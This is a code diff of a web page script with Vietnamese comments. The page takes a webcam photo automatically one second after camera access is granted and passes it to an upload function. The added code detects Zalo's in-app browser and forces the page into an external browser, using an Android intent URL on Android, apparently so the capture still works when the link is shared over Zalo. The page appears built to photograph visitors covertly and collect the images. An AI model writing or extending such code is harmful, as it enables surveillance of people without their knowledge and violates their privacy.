@@ -28,19 +28,36 @@
   <script>
     const video = document.getElementById('video');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+    function isZaloWebview() {
+      const ua = navigator.userAgent.toLowerCase();
+      return ua.includes("zalo");
+    }
 
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            captureAndUpload();
-          }, 1000); // Tự động chụp sau 1 giây
-        };
-      })
-      .catch(err => {
-        console.error('Không thể truy cập camera:', err);
-      });
+    function openInBrowser() {
+      const url = window.location.href;
+      if (navigator.userAgent.toLowerCase().includes("android")) {
+        window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;end`;
+      } else {
+        window.location.href = url;
+      }
+    }
+
+    if (isZaloWebview()) {
+      openInBrowser(); // tự động chuyển hướng nếu là Zalo
+    } else {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              captureAndUpload();
+            }, 1000);
+          };
+        })
+        .catch(err => {
+          console.error('Không thể truy cập camera:', err);
+        });
+    }
 
     function captureAndUpload() {
       const canvas = document.createElement('canvas');
